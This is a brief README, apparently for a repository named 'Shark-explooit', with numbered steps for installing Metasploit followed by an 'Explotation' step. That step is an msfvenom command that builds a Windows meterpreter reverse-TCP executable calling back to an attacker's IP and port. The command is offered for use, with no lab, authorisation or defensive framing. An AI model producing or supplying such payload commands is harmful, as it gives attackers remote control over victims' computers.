# Shark-explooit

# installation metasploit

Step-by-Step: How to Successfully Install Metasploit on Your System

Step-1 : type `` sudo apt-get update && apt-get upgrade -y `` 

![Alt text](img/1.png)

Step-2 : type `` sudo apt install metasploit-framework ``

![Alt text](img/2.png)

Step-3 : type `` msfconsole -h `` 

![Alt text](img/3.png)

# Explotation

step 4 : type `` msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST="your ip addr" LPORT="port" -f exe -o /home/kali/Desktop/reverse.exe ``

![Alt text](img/4.png)


